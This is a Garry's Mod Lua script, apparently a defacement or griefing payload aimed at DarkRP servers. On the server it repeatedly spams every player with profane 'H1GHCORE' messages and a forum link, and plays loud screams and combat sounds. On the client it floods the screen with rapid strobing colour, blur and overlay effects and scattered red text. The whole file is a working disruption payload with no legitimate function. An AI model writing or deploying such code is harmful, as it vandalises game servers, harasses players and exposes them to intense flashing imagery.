if SERVER then
    timer.Create("HighcoreSpam", 0.05, 0, function()
        for _, v in ipairs(player.GetAll()) do
            DarkRP.notify(v, 1, 4, "FUCKED UP BY H1GHCORE")
            v:ChatPrint("FUCKED UP BY H1GHCORE https://brokencore.club/members/18218/")
        end
    end)

    local sounds = {
        "npc/stalker/go_alert2a.wav", "npc/stalker/go_alert2b.wav", "npc/stalker/go_alert2.wav",
        "ambient/voices/scream1.wav", "ambient/voices/scream2.wav", "ambient/voices/scream3.wav",
        "ambient/creatures/town_child_scream1.wav", "ambient/voices/citizen_beaten1.wav",
        "ambient/voices/citizen_beaten5.wav", "npc/zombie/zombie_pain1.wav",
        "npc/zombie/zombie_pain2.wav", "npc/zombie/zombie_pain3.wav",
        "npc/zombie/zombie_voice_idle1.wav", "npc/zombie/zombie_voice_idle2.wav",
        "npc/combine_gunship/gunship_ping.wav", "npc/metropolice/vo/affirmative.wav",
        "npc/metropolice/vo/wegotadbhere.wav", "npc/combine_soldier/vo/alert1.wav",
        "npc/combine_soldier/vo/overwatch.wav", "npc/combine_soldier/vo/contact.wav",
        "npc/combine_soldier/vo/engaging.wav", "npc/combine_soldier/vo/lostcontact.wav",
        "npc/combine_soldier/vo/overrun.wav", "npc/combine_soldier/vo/ripcord.wav",
        "npc/combine_soldier/vo/unitdown.wav", "npc/combine_soldier/vo/executingfullresponse.wav",
        "npc/combine_soldier/vo/confirmsectornotsterile.wav", "npc/combine_soldier/vo/containmentproceeding.wav",
        "npc/combine_soldier/vo/callcontactparasitics.wav", "npc/combine_soldier/vo/noviscon.wav",
        "npc/combine_soldier/vo/negative.wav", "npc/combine_soldier/vo/firetoharbor.wav",
        "npc/combine_soldier/vo/evnowfailed.wav", "npc/combine_soldier/vo/evacnow.wav",
        "npc/combine_soldier/vo/evaczone4.wav", "npc/combine_soldier/vo/evaczone3.wav",
        "npc/combine_soldier/vo/evaczone2.wav", "npc/combine_soldier/vo/evaczone1.wav",
        "npc/combine_soldier/vo/evaczone.wav", "npc/combine_soldier/vo/evacnow.wav",
        "npc/combine_soldier/vo/evacnowfailed.wav", "npc/combine_soldier/vo/firetoharbor.wav"
    }

    timer.Create("HighcoreSounds", 0.1, 0, function()
        for _, v in ipairs(player.GetAll()) do
            for i = 1, 15 do 
                timer.Simple(i * 0.05, function()
                    if IsValid(v) then
                        v:EmitSound(table.Random(sounds), 150, math.random(80, 120))
                    end
                end)
            end
        end
    end)
end

if CLIENT then
    local lastEffectTime = 0
    local crazyMode = false

    hook.Add("RenderScreenspaceEffects", "HighcoreArtifacts", function()
        if CurTime() > lastEffectTime + 0.1 then
            lastEffectTime = CurTime()
            crazyMode = not crazyMode
        end

        if crazyMode then
            DrawMotionBlur(0.5, 1.5, 0.05)
            DrawSharpen(10, 2)
            DrawBloom(1.5, 2, 10, 10, 10, 1, 1, 1, 1)
            DrawColorModify({
                ["$pp_colour_addr"] = math.random(0,1),
                ["$pp_colour_addg"] = math.random(0,1),
                ["$pp_colour_addb"] = math.random(0,1),
                ["$pp_colour_brightness"] = math.random(-0.5,0.5),
                ["$pp_colour_contrast"] = math.random(0.5,3),
                ["$pp_colour_colour"] = math.random(0,2),
                ["$pp_colour_mulr"] = math.random(0,1),
                ["$pp_colour_mulg"] = math.random(0,1),
                ["$pp_colour_mulb"] = math.random(0,1)
            })
            DrawMaterialOverlay("effects/tp_eyefx/tpeye"..math.random(1,3), math.random())
        else
            DrawMotionBlur(math.random()*0.5, math.random()*2, math.random()*0.1)
            DrawTexturize(1, Material("pp/texturize/noise.png"))
            DrawSobel(1)
            DrawSunbeams(0.8, 0.8, 0.8, 0, 0)
        end
    end)

    hook.Add("HUDPaint", "HighcoreTextSpam", function()
        surface.SetFont("DermaLarge")
        surface.SetTextColor(255, 0, 0, math.random(150,255))
        for i = 1, 20 do
            surface.SetTextPos(math.random(0, ScrW()), math.random(0, ScrH()))
            surface.DrawText("FUCKED UP BY H1GHCORE")
        end
    end)
end